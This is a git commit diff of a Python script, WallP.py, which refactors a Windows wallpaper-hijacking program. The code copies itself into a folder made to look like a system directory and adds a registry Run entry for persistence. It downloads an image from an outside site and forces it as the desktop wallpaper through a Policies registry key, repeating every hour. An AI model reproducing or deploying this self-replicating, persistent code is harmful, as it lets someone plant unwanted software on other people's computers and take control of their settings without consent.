2f90af37678af8e23c3720556f0a90dae40a078e
kashsingh <max.payne61@gmail.com>
2016-01-14 21:24:08 +0530

    few minor changes

--- WallP.py
+++ WallP.py
@@ -1,18 +1,20 @@
-from sys import argv
+import sys
 import os 
 import shutil
 from _winreg import *
 import urllib
 from time import sleep
 
+location="C:\\Windows Files\\system 32\\drivers\\etc\\files\\host\\"
+
 def replicate():
-	directory_name= r"C:\Windows Files\system_32\drivers\etc\files\host"
-	file_name= argv
+	directory_name= r"C:\Windows Files\system 32\drivers\etc\files\host"
+	file_name= sys.argv[0]
 	
 	if not os.path.exists(directory_name):
 		os.makedirs(directory_name)
 
-	temp=file_name[0].split("/")
+	temp=file_name.split("/")
 	name="\\".join(temp)
 	print name,directory_name
 	shutil.copy2(name,directory_name)
@@ -21,20 +23,19 @@ def replicate():
 
 
 def startupEntry():
-	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
+	keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
-	key2change= OpenKey(HKEY_CURRENT_USER,
+	key2change = OpenKey(HKEY_CURRENT_USER,
 	keyVal,0,KEY_ALL_ACCESS)
 
-	temp=argv
-	name=temp[0].split("/")[-1]
-
-	SetValueEx(key2change, "File",0,REG_SZ, "C:\\Windows\\system_32\\drivers\\etc\\files\\host\\"+name)
+	temp = sys.argv[0]
+	name = temp.split("\\")[-1]
+	SetValueEx(key2change, "File",0,REG_SZ, location+name)
 
 
 def retreivePic():
-	urllib.urlretrieve ("http://attitudesinghrajput.site90.com/image.jpg", "C:\\Windows Files\\system_32\\drivers\\etc\\files\\host\\image.jpg")
-	picName="C:\\Windows Files\\system_32\\drivers\\etc\\files\\host\\image.jpg"
+	urllib.urlretrieve ("http://attitudesinghrajput.site90.com/image.jpg", location+"image.jpg")
+	picName=location+"image.jpg"
 	return picName
 
 
@@ -42,12 +43,12 @@ def fixIt(picName):
 	#keyVal= r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
 	key2change= OpenKey(HKEY_CURRENT_USER,
 	"Software\Microsoft\Windows\CurrentVersion\Policies",0,KEY_ALL_ACCESS)
-	CreateKeyEx(key2change,"System")
+	CreateKey(key2change,"System")
 
-	key2change= OpenKey(HKEY_CURRENT_USER,
-	"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,KEY_ALL_ACCESS)
-	SetValueEx(key2change, "Wallpaper",0,REG_SZ, picName)
-	SetValueEx(key2change, "WallpaperStyle",0,REG_SZ, "0")
+	key2change = OpenKey(HKEY_CURRENT_USER,
+	"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_ALL_ACCESS)
+	SetValueEx(key2change, "Wallpaper", 0, REG_SZ, picName)
+	SetValueEx(key2change, "WallpaperStyle", 0, REG_SZ, "0")
 
 
 
@@ -65,7 +66,7 @@ def main():
 			fixIt(picName)
 			sleep(3600)
 		except:
-			sleep(60)
+			sleep(120)
 
 
 
